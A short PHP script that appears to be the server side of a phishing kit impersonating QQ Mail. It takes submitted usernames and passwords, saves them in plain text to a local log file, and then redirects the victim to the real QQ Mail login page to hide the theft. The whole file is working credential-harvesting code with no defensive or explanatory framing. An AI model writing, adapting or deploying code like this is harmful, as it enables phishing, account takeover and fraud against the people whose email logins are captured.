<?php

$username = $_REQUEST['username'];
$password = $_REQUEST['password'];

$log = fopen("save/mailqq.txt", "a");
fwrite($log, $username ."  ".$password. "\r\n");
fclose($log);


echo '<script language="javascript">';
echo "location.href='https://mail.qq.com/cgi-bin/loginpage'";
echo '</script>';

?>
